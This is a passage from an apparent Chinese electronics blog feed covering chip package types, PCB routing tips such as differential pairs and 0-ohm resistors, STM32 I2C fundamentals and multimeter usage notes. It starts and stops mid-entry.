协议保护，转载请注明出处。</p></blockquote><h1 id="常见的芯片封装"><a href="#常见的芯片封装" class="headerlink" title="常见的芯片封装"></a>常见的芯片封装</h1><h2 id="QFN封装"><a href="#QFN封装" class="headerlink" title="QFN封装"></a>QFN封装</h2><p>比较特殊的有<code>QFN</code>封装的芯片，这类芯片不同点在于其芯片下方又有一些焊盘用以接地。由于在芯片的下方，所以不好焊接。但是其一般旁边都会开一些过孔，用以方便焊接。</p><p>QFN是一种无引线四方扁平封装，是具有外设终端垫以及一个用于机械和热量完整性暴露的芯片垫的无铅封装。</p><p>在芯片底部大多数会设计一块较大的地平面，对于功率型IC，该平面会很好的解决散热问题，通过PCB的铜皮设计，可以将热量更快的传导出去，该封装可为正方形或长方形。</p><p>封装四侧配置有电极触点，由于无引脚，贴装占有面积比QFP 小，高度比QFP 低，<strong>为目前比较流行的封装类型。</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403210106223.png"></p><p>中间GND的功能有两种</p><ol><li>方便更好的散热，</li><li>有足够的接地面积可以保证上下电的平滑稳定</li></ol><p>解决方法是：</p><ul><li><p>常见的焊接方法一般是使用“铁板烧”或者是热风枪。</p></li><li><p>如果底部是一个比较大的大焊盘的话，还可以通过在底部开窗的方式来解决：</p><p>  <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403210059343.png"></p></li></ul><h2 id="DIP封装"><a href="#DIP封装" class="headerlink" title="DIP封装"></a>DIP封装</h2><p>DIP是指采用双列直插形式封装的集成电路芯片，这种芯片封装已经有很多年的历史，如51单片机、AC-DC控制器、光耦运放等都在使用这种封装类型。</p><p>采用DIP封装的CPU芯片有两排引脚，可以通过专用底座进行使用，当然，也可以直接插在有相同焊孔数和几何排列的电路板上进行焊接，对于插在底座上使用，可以易于更换，焊接难度也很低，只需要电烙铁便可以进行焊接装配。</p><p>  <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403210100151.png"></p><h2 id="LQFP-TQFP封装"><a href="#LQFP-TQFP封装" class="headerlink" title="LQFP&#x2F;TQFP封装"></a>LQFP&#x2F;TQFP封装</h2><p> PQFP&#x2F;TQFP封装的芯片四周均有引脚，引脚之间距离很小、管脚很细，用这种形式封装的芯片可通过回流焊进行焊接，焊盘为单面焊盘，不需要打过孔，在焊接上相对DIP封装的难度较大。</p><p> 目前许多单片机和集成芯片都在使用这种封装，由于此封装自带突出引脚，在运输焊接过程中需要小心，防止引脚弯曲或损坏。</p><p> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403210101699.png"></p><h2 id="LGA封装"><a href="#LGA封装" class="headerlink" title="LGA封装"></a>LGA封装</h2><p> LGA封装为底部方形焊盘，<strong>区别于QFN封装</strong>，在芯片侧面没有焊点，焊盘均在底部。这种封装对焊接要求相对较高，对于芯片封装的设计也有很高的要求，否则批量生产很容易造成虚焊以及短路的情况，在小体积、高级程度的应用场景中这种封装的使用较多。</p><p> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403210102711.png"></p><h2 id="BGA（球栅阵列）封装"><a href="#BGA（球栅阵列）封装" class="headerlink" title="BGA（球栅阵列）封装"></a>BGA（球栅阵列）封装</h2><p>随着集成技术的进步、设备的改进和深亚微米技术的使用，LSI、VLSI、ULSI相继出现，硅单芯片集成度不断提高，对集成电路封装要求更加严格，I&#x2F;O引脚数急剧增加，功耗也随之增大。</p><p>BGA封装是一种电子元件封装技术，它是指将电子元件封装在一个多层、由金属和陶瓷组成的球形结构中，以提供更好的热传导性能和更小的封装尺寸。</p><p>BGA封装可以提供更多的连接点，比普通的插件封装多出几倍，因此可以提供更高的信号完整性和更低的电阻。</p><p>BGA封装还可以提供更高的功率密度，以及更低的电磁干扰（EMI）。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403210104712.png"></p><h2 id="SO封装"><a href="#SO封装" class="headerlink" title="SO封装"></a>SO封装</h2><p> SO类型封装有很多种类，可以分为：SOP(小外形封装)、TOSP（薄小外形封装）、SSOP (缩小型SOP)、VSOP（甚小外形封装）、SOIC（小外形集成电路封装）等类似于QFP形式的封装，只有两边有管脚的芯片封装形式，该类型的封装是表面贴装型封装之一，引脚从封装两侧引出呈“ L” 字形。</p><p> 该类型封装的典型特点就是在封装芯片的周围做出很多引脚，封装操作方便、可靠性比较高、焊接也比较方便，如常见的SOP-8等封装在各种类型的芯片中被大量使用。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403210107808.png"></p><h1 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h1><p>单端信号是指在一条走线上传输信号，然后使用一个共同的参考平面作为信号的返回路径。当我们在电路板上布线时，接地平面是信号的返回路径，这就是单端信号。大多数 PCB 网络都是这样布线的。然而，这种布线方式有一个问题：随着传输线速度提高，单端信号可能会受到一些问题的影响，包括串扰噪音和电磁干扰 (EMI)。此时，差分信号就派上了用场。</p><p>什么是<strong>差分线对</strong>？在进行 <code>PCB</code> 设计的时候，我们常常会在 <code>EDA</code> 软件中看到 “差分线对” 这个选项。所以，什么是<strong>差分线对</strong>？</p><p><strong>差分线用通俗的话讲，用两条平行的、等长的走线传输相位差180度的同一信号。</strong>说白了，就是一根线传输正信号，一根线传输负信号。正信号减去负信号，得到2倍强度的有用信号。而两根线路上的干扰信号是一样的，相减之后干扰信号就没了。</p><p>由上，我们可以知道<strong>差分线对</strong>的作用主要是<strong>抗干扰</strong></p><p>差分线与普通线相比的优势：</p><ul><li>抗扰能力强</li><li>能有效抑制EMI</li><li>时序定位精确的优势。</li></ul><p>放置插分线的要求：</p><ul><li>两根线等长</li><li>两根线等宽</li><li>紧密靠近</li><li>在同一层面的两根线。</li></ul><p>差分线的应用：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404242235053.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404242235964.png"></p><h2 id="扇出"><a href="#扇出" class="headerlink" title="扇出"></a>扇出</h2><p>将电线从焊盘处引出，使用过孔作为一个端点。 如图下所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291230335.png"></p><p> <strong>其实扇出主要应用于多层板上</strong></p><p>下图可以看到需要保证<strong>平面的完整性</strong>。所谓的平面的完整性通常指的是平面上敷铜的完整性，可以保证信号回流通畅。因为孤铜是需要删去的。</p><p> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291931696.png"></p><h2 id="出线"><a href="#出线" class="headerlink" title="出线"></a>出线</h2><p><strong>关于出线的问题</strong></p><p><strong>一定要做到垂直于焊盘进行出现</strong>，这样可以保证信号回流通畅：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292028637.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292028719.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292029329.png"></p><p>上面三张图体现出了出线的位置。</p><h2 id="单数板和双数板"><a href="#单数板和双数板" class="headerlink" title="单数板和双数板"></a>单数板和双数板</h2><p>为什么只看到过双数层板，但是却没有看到过单数层数板呢？<br>-双数层板内部的应力可以相互抵消，使得双数层板更加不易变形。同理使用单数层板无法做到这一点，为了使得板子有更好的物理性能，一般使用双层版。</p><h2 id="EMC和EMI"><a href="#EMC和EMI" class="headerlink" title="EMC和EMI"></a>EMC和EMI</h2><h3 id="EMC"><a href="#EMC" class="headerlink" title="EMC"></a>EMC</h3><p><code>EMC</code> 中文称之为 ”电磁兼容性“。是指电气元件、设备和系统在其环境中按设计运行的能力。</p><h3 id="EMI"><a href="#EMI" class="headerlink" title="EMI"></a>EMI</h3><p><code>EMI</code> 中文称之为 ”电磁干扰“。是指电气设备、系统或电路在正常工作过程中，由于其自身的电磁环境、环境噪声、电磁波干扰等原因而引起的信号失真、失真、失</p><h2 id="0欧电阻和标注了-nc-的电阻"><a href="#0欧电阻和标注了-nc-的电阻" class="headerlink" title="0欧电阻和标注了 nc 的电阻"></a>0欧电阻和标注了 nc 的电阻</h2><h3 id="0欧姆电阻的作用和意义"><a href="#0欧姆电阻的作用和意义" class="headerlink" title="0欧姆电阻的作用和意义"></a>0欧姆电阻的作用和意义</h3><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ol><li><strong>跳线</strong>：美观且安装方便。</li><li><strong>混合电路接地</strong>：数字和模拟地分开，单点连接，便于处理大面积铺铜，注意这个功能，0欧 电阻通常被用来隔离数字地和模拟地。</li><li><strong>保险丝</strong>：过流时熔断，防止更大事故。</li><li><strong>调试预留</strong>：根据需要决定是否安装或选择其他值。</li><li><strong>配置电路</strong>：固定焊接，防止用户随意修改配置。</li></ol><h4 id="规格"><a href="#规格" class="headerlink" title="规格"></a>规格</h4><ul><li>按功率分，如1&#x2F;8瓦，1&#x2F;4瓦等。</li></ul><h4 id="详细应用"><a href="#详细应用" class="headerlink" title="详细应用"></a>详细应用</h4><ol><li><strong>模拟地和数字地单点接地</strong>：避免互相干扰，使用0欧姆电阻连接。</li><li><strong>跨接电流回路</strong>：提供较短的回流路径，减小干扰。</li><li><strong>配置电路</strong>：代替跳线和拨码开关，减少维护费用。</li><li><strong>其他用途</strong>：<ul><li>跨线调试&#x2F;测试。</li><li>临时取代其他贴片器件作为温度补偿器件。</li><li>EMC对策，如地与地、电源和IC Pin间。</li></ul></li></ol><h4 id="其他特点"><a href="#其他特点" class="headerlink" title="其他特点"></a>其他特点</h4><ul><li>0欧姆电阻比过孔的寄生电感小，不影响地平面。</li></ul><h3 id="NC（No-Connection）的意义"><a href="#NC（No-Connection）的意义" class="headerlink" title="NC（No Connection）的意义"></a>NC（No Connection）的意义</h3><ul><li>表示该元件可以不安装，安装后电路可能有额外功能或性能变化。</li><li>用于通用PCB板，通过不同元件装配生产不同产品型号。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406021606958.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406021607393.png"></li></ul><h3 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h3><ul><li>0欧姆电阻在电路设计中扮演重要角色，特别是在混合信号电路、高频信号处理和EMC对策中。</li><li>NC标记在电路设计中用于灵活性和成本效益，允许制造商使用通用PCB板生产不同产品。</li></ul><h1 id="常见的英文简称"><a href="#常见的英文简称" class="headerlink" title="常见的英文简称"></a>常见的英文简称</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/%E6%89%B9%E6%B3%A8%202024-02-19%20220654.png"></p><h1 id="项目经验总结"><a href="#项目经验总结" class="headerlink" title="项目经验总结"></a>项目经验总结</h1><p><strong>这个都是我通过学习别人的项目学习到的知识点。</strong></p><ol><li><p>很多的 diy 项目在使用电池的时候一般都是直接将引脚焊接在 pcb板 上面的，但是我感觉这样对于一个 diy 项目来说是可以的，但是如果是一个商业产品的话应该是很难使用的。<strong>但是，也有的项目会使用专门的航模电池接口，也有一些直接在 pcb板 上添加一个焊盘</strong></p><ol><li><p>航模电池接口</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251722975.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251723755.png"></p></li><li><p>直接使用焊盘，或者是使用测试点。使用测试点的好处是有利于布线，因为测试点是需要连线的，但是直接使用焊盘是无法连线的。</p><ol><li>注意需要在焊盘上放置过孔<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405250304724.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405250311858.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252058325.png"></li><li>使用测试点<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252056695.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252057211.png"></li></ol></li></ol></li><li><p>横着使用的排插</p><ol><li>其实就是将排插横着焊<br><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252127159.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252127904.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252129012.png"></li></ol></li><li><p>多板连用的方法</p><ol><li>通过使用下面这种排线连接<ol><li>线对板针座<br>  <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251516551.png"><br>  <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251919079.png"></li></ol></li><li>进行物理连接，使用尼龙柱或者M3转M2的避震柱<br> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251923003.png"><br> 在原理图中放置螺丝<br><br> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252205812.png"></li><li>打孔，一般打孔的方式有两种。一种是直接使用焊盘，另一种是直接挖孔</li><li>直接使用焊盘，注意使用这种方法的时候需要将<strong>图层调到多层，而不是某个单一的层</strong><br> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252158997.png"><br> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252158426.png"></li><li>直接使用挖空功能</li></ol></li><li><p>在 pcb板 布线的时候，可以在 pcb板 上放置大量的过孔。提高板子的散热能力，降低阻抗<br>   <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251929381.png"></p></li><li><p>如果是多层板的话，可以减少布线，转而使用过孔、铺铜来代替布线，这样可以减少过线长度</p><ol><li>在焊盘上放置过孔，然后铺铜。<br><br>   <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251932487.png"></li></ol></li><li><p>绘制顶层、底层阻焊层，作用是 pcb板 上的绿色的一层阻焊层挖掉，这样会露出里面的铜层，如果里面有的话。有利于散热。<br>   在阻焊层中绘制图形会导致该图形中的<strong>阻焊层被去掉</strong><br><br>   <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252210375.png"><br>   <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252212195.png"></p></li><li><p>在电源线中，可以直接使用铺铜来替代布线。这样可以提高负载。<br>   <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252203803.png"><br>   <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405252205040.png"></p></li></ol><h1 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p><a href="https://www.elecfans.com/d/2330481.html">https://www.elecfans.com/d/2330481.html</a></p></li><li><p><a href="https://www.shuangyi-tech.com/news_895.html">封装</a></p></li><li><p><a href="https://murata.eetrend.com/article/2020-12/1004073.html">差分线1</a></p></li><li><p><a href="https://www.u-c.com.cn/archives/7611c">差分线2</a></p></li><li><p><a href="https://mp.ofweek.com/ee/a945693520486">扇孔与出线</a></p></li><li><p><a href="https://seujxh.wordpress.com/2018/02/20/pcb%E6%89%87%E5%AD%94/">扇孔</a></p></li><li><p><a href="https://blog.csdn.net/m0_37872216/article/details/100358313">BAG扇孔</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32-IIC总结</title>
    <link href="/2023/12/01/stm32-IIC%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/01/stm32-IIC%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>总结stm32中的IIC通信</p><span id="more"></span><h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>I2C通信的特点</p><ol><li>串行</li><li>半双工</li><li>同步</li><li>只需2根线（SCL、SDA）</li><li>可以多主机进行通信</li></ol><h2 id="I2C的传输速度"><a href="#I2C的传输速度" class="headerlink" title="I2C的传输速度"></a>I2C的传输速度</h2><p>具有三种传输模式：标准模式传输速率为100kbit&#x2F;s ，快速模式为400kbit&#x2F;s ， 高速模式下可达 3.4Mbit&#x2F;s，但目前大多I2C设备尚不支持高速模式。</p><h2 id="I2C可挂载的设备"><a href="#I2C可挂载的设备" class="headerlink" title="I2C可挂载的设备"></a>I2C可挂载的设备</h2><p>连接到相同总线的 IC 数量受到总线的最大电容 400pF 限制。最大的IC总线的数量还受到了地址位的个数（7bit地址位，或者是10bit地址位）在7bit下2^7有128-1（0x00无效）。</p><p>I2C的总线“线与”功能，只要有一个设备发出了低信号，则整个总线就是低信号</p><p>主机发送结束条件（P）终止一次传输。主机也可以通过发起重复开始条件（Sr）进行一次新的传输，而不需要先产生结束条件（P）。</p><h2 id="I2C的仲裁方式"><a href="#I2C的仲裁方式" class="headerlink" title="I2C的仲裁方式"></a>I2C的仲裁方式</h2><p><strong>遵循“低电平优先”的原则，即谁先发送低电平谁就会掌握对总线的控制权。</strong></p><h2 id="I2C通信的流程和对应的电平状态"><a href="#I2C通信的流程和对应的电平状态" class="headerlink" title="I2C通信的流程和对应的电平状态"></a>I2C通信的流程和对应的电平状态</h2><p>首先I2C的两根线在空闲状态下都是高电平。</p><p>I2C通信<strong>开始信号和结束信号</strong>：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312011608384.png"></p><div class="note note-info">            <p>由于这个开始信号所以导致了，I2C通信在只有在SCL线为高电平时SDA线才是有效的。只有在SCL线为低电平的时候，SDA线才是允许变化的。因为在SCL为高电平时SDA线变化的话就先当于开始信号或者是结束信号。</p>          </div><p><strong>响应信号</strong>：传输时主机产生时钟，在第9个时钟时，数据发送端会释放SDA的控制权，由数据接收端控制SDA， 若SDA为高电平，表示非应答信号(NACK)，低电平表示应答信号(ACK)。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312011843062.png"></p><h2 id="I2C中的三种基本读写步骤"><a href="#I2C中的三种基本读写步骤" class="headerlink" title="I2C中的三种基本读写步骤"></a>I2C中的三种基本读写步骤</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312011616381.png"></p><p>第三种：读和写数据</p><p>除了基本的读写，I2C通讯更常用的是复合格式，即第三幅图的情况，该传输过程有两次起始信号(S)。一般在第一次传输中， 主机通过SLAVE_ADDRESS寻找到从设备后，发送一段“数据”，<strong>这段数据通常用于表示从设备内部的寄存器或存储器地址(注意区分它与SLAVE_ADDRESS的区别)<strong>； 在第二次的传输中，对该地址的内容进行读或写。也就是说，第一次通讯是告诉从机读写地址，第二次则是读写的实际内容。如果主机接收器发送一个重复起始条件 它之前应该发送了一个</strong>不响应信号</strong>。</p><h2 id="7bit寻址"><a href="#7bit寻址" class="headerlink" title="7bit寻址"></a>7bit寻址</h2><p>I2C总线的寻址过程是通常在起始条件后的第一个字节决定了主机选择哪一个从机。例外的情况是可以寻址所有器件的 <strong>广播呼叫</strong> 地址 使用这个地址时 理论上所有器件都会发出一个响应，但是也<strong>可以使器件忽略这个地址</strong>，广播呼叫地址的第二个字节定义了要采取的行动。</p><h3 id="第一个字节的未定义"><a href="#第一个字节的未定义" class="headerlink" title="第一个字节的未定义"></a>第一个字节的未定义</h3><p>由于I2C通信每次都是发送8bit数据，其第一个数据一般都是地址位：</p><p>第一个字节的最低位是 0 表示主机会写信息到被选中的从机 1 表示主机会向从机读信息。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312021642843.png"></p><p>从机地址由一个固定和一个可编程的部分构成，由于很可能在一个系统中有几个同样的器件。从机地址的可编程部分控制了可以连接到I2C总线上的同器件的最大数量。器件可编程地址位的数量由它可使用的管脚决定。例如，如果器件有 4 个固定的和 3 个可编程的地址位，那么相同的总线上共可以连接 8 个相同的器件。</p><h2 id="stm32中的I2C外设"><a href="#stm32中的I2C外设" class="headerlink" title="stm32中的I2C外设"></a>stm32中的I2C外设</h2><p>在stm32f10x中的，有两个I2C控制器。其结构图如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312011559936.png"></p><p>其中接收器和发送器：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312011601180.png"></p><p>注意图中的EV7_1就是EV7</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312011601223.png"></p><h2 id="I2C通讯的优缺点"><a href="#I2C通讯的优缺点" class="headerlink" title="I2C通讯的优缺点"></a>I2C通讯的优缺点</h2><p>优点：</p><ol><li>只有两根线，结构简单</li><li>具有应答位，数据传输的准确性有一定的保障</li><li>支持多个主机和多个从机</li></ol><p>缺点：</p><ol><li>有开始位、停止位、应答位，导致数据传输不稳定，传输速度低</li><li>数据帧大小被限制为8bit</li></ol><h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><h2 id="初始化结构体"><a href="#初始化结构体" class="headerlink" title="初始化结构体"></a>初始化结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> I2C_ClockSpeed; <span class="hljs-comment">/*!&lt; 设置SCL时钟频率，此值要低于400000*/</span><br>    <span class="hljs-type">uint16_t</span> I2C_Mode;      <span class="hljs-comment">/*!&lt; 指定工作模式，可选I2C模式及SMBUS模式 */</span><br>    <span class="hljs-type">uint16_t</span> I2C_DutyCycle; <span class="hljs-comment">/*指定时钟占空比，可选low/high = 2:1及16:9模式*/</span><br>    <span class="hljs-type">uint16_t</span> I2C_OwnAddress1;     <span class="hljs-comment">/*!&lt; 指定自身的I2C设备地址 */</span><br>    <span class="hljs-type">uint16_t</span> I2C_Ack;                 <span class="hljs-comment">/*!&lt; 使能或关闭响应(一般都要使能) */</span><br>    <span class="hljs-type">uint16_t</span> I2C_AcknowledgedAddress; <span class="hljs-comment">/*!&lt; 指定地址的长度，可为7位及10位 */</span><br>&#125; I2C_InitTypeDef;<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>注意的是，I2C_OwnAddress1是随意设置的。只要不和其他挂载在IIC总线上的设备地址一致即可。</p>          </div><h2 id="编程步骤"><a href="#编程步骤" class="headerlink" title="编程步骤"></a>编程步骤</h2><ol><li>定义初始化结构体进行初始化配置</li><li>使用I2C_Init()函数完成初始化</li><li>使用I2C_CMD()函数打开I2C外设</li></ol><div class="note note-warning">            <p>I2C外设不需要使用RCC函数打开时钟</p>          </div><h2 id="I2C传输步骤"><a href="#I2C传输步骤" class="headerlink" title="I2C传输步骤"></a>I2C传输步骤</h2><p><strong>I2C_GenerateSTOP()这个函数是用来创建停止条件的，不是发送停止信号的。</strong><br>其他的I2C_GenerateXX()函数是一样的，都是创建条件而不是直接发送信号。</p><h2 id="stm32中标准库的相关函数"><a href="#stm32中标准库的相关函数" class="headerlink" title="stm32中标准库的相关函数"></a>stm32中标准库的相关函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>IIC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电子测量仪通用术语与相关原理</title>
    <link href="/2023/12/01/%E7%94%B5%E5%AD%90%E6%B5%8B%E9%87%8F%E4%BB%AA%E5%99%A8%E9%80%9A%E7%94%A8%E6%9C%AF%E8%AF%AD%E4%B8%8E%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/"/>
    <url>/2023/12/01/%E7%94%B5%E5%AD%90%E6%B5%8B%E9%87%8F%E4%BB%AA%E5%99%A8%E9%80%9A%E7%94%A8%E6%9C%AF%E8%AF%AD%E4%B8%8E%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>记载电子测量仪器通用术语与相关原理，以及一般用法。</p><span id="more"></span><h1 id="万用表的基本功能"><a href="#万用表的基本功能" class="headerlink" title="万用表的基本功能"></a>万用表的基本功能</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312010231530.png"></p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol><li>当显示<strong>0l</strong>,或者是<strong>1</strong>的时候表示此时测量的值超过了量程，我们需要上调量程。</li><li>当对被测的大小没有概念时，应该首先使用最大的量程。</li><li>不同的万用表的蜂鸣器模式和二极管模式有不同的测量范围，比如我使用的胜利VC890D万用表，当测量之间的电阻小于50欧的时候认为两点之间是通路。高于200欧时，会自动跳转到二极管模式。所以在使用不同的万用表时需要看手册。</li><li><strong>红进黑出</strong>，红笔应该接正极，黑笔接负极。测量二极管时，黑笔接有竖线的一边。</li><li>如果显示了负号则表示红黑笔接反了。交流测量不需要分辨正负极。</li><li>注意测量不同的数据前看看是否需要换<strong>插孔</strong>。</li><li>AC：交流 DC：直流</li></ol><h2 id="万用表的妙用"><a href="#万用表的妙用" class="headerlink" title="万用表的妙用"></a>万用表的妙用</h2><ol><li>短路的测量方法：使用蜂鸣档直接测量，当蜂鸣器鸣叫时为短路，反之为正常。</li><li>判断是否线路中是否有电：数字的交流电压挡很灵敏，哪怕周围有很小的感应电压都可以有显示。根据这一特点，可以当作测试电笔用。</li></ol><p>用法如下：将万用表打到AC20V挡，黑表笔悬空，手持红表笔与所测路线或器件相接触，这时万用表会有显示，如果显示数字在几伏到十几伏之间（不同的万用表会有不同的显示），表明该线路或器件带电，如果显示为零或很小，表明该线路或器件不带电。</p><h2 id="万用表注意点"><a href="#万用表注意点" class="headerlink" title="万用表注意点"></a>万用表注意点</h2><ol><li>如果万用表的电流档无法显示电流，需要检查<strong>万用表的保险丝是否完好</strong>，如果保险丝破损，则需要更换。保险丝的位置一般在电池附近。保险丝规格的选择：<img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406021950202.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406021950835.png"></li></ol><p>如何知道保险丝是否完好：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406021951930.png"></p><p><strong>使用这种方法也可以检查万用表的电流档是否正常工作</strong>。</p><p><strong>电子测量仪器</strong>是电子信息技术产业的基础支撑性设备，全球超过 <strong>50%</strong> 的电子仪器市场份额被<a href="https://www.keysight.com/">是德科技 <strong>Keysight</strong></a>、<a href="https://www.tek.com.cn/">泰克 <strong>Tek</strong></a>、<a href="https://www.teledynelecroy.com.cn/">力科 <strong>Lecroy</strong></a>、<a href="https://www.rohde-schwarz.com.cn/">罗德与施瓦茨 <strong>Rohde&amp;Schwarz</strong></a>四家企业所垄断。伴随近几年电子科技行业卡脖子风险的上升，国内密集出台了多部涉及仪器仪表行业以及相关领域的产业政策，在政策支持与下游产业的快速发展之下，我国电子测量仪器近几年实现了高速增长，涌现出了 <a href="https://www.rigol.com/"><strong>普源精电</strong></a>、<a href="https://www.tonghui.com.cn/"><strong>同惠电子</strong></a>、<a href="https://www.uni-trend.com.cn/"><strong>优利德科技</strong></a> 等科创板挂牌上市仪器厂商。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111902502.png"></p><p>电子工程实验当中，必不可少的涉及到大量测量仪器的使用，本文主要记录笔者工作室当中所使用的 <strong>数字万用表</strong>（Multimeter）、<strong>数字电桥</strong>（LCR Meter）、<strong>数字存储示波器</strong>（DSO）、<strong>逻辑分析仪</strong>（Logic Analyzer）、<strong>可编程直流电源</strong>（DC Supply）、<strong>信号发生器</strong>（Signal Generator）等仪器的性能指标术语，包括 <code>三极管测量</code>、<code>电源纹波</code>、<code>晶振频率</code>、<code>谐波输出</code> 等常规的测量方法与技巧，以及相关的注意事项。</p><h2 id="数字万用表-Digital-Multimeter"><a href="#数字万用表-Digital-Multimeter" class="headerlink" title="数字万用表 Digital Multimeter"></a>数字万用表 Digital Multimeter</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312010231530.png"></p><h3 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h3><ol><li>当显示<strong>0l</strong>,或者是<strong>1</strong>的时候表示此时测量的值超过了量程，我们需要上调量程。</li><li>当对被测的大小没有概念时，应该首先使用最大的量程。</li><li>不同的万用表的蜂鸣器模式和二极管模式有不同的测量范围，比如我使用的胜利VC890D万用表，当测量之间的电阻小于50欧的时候认为两点之间是通路。高于200欧时，会自动跳转到二极管模式。所以在使用不同的万用表时需要看手册。</li><li><strong>红进黑出</strong>，红笔应该接正极，黑笔接负极。测量二极管时，黑笔接有竖线的一边。</li><li>如果显示了负号则表示红黑笔接反了。交流测量不需要分辨正负极。</li><li>注意测量不同的数据前看看是否需要换<strong>插孔</strong>。</li><li>AC：交流 DC：直流</li></ol><h3 id="万用表的妙用-1"><a href="#万用表的妙用-1" class="headerlink" 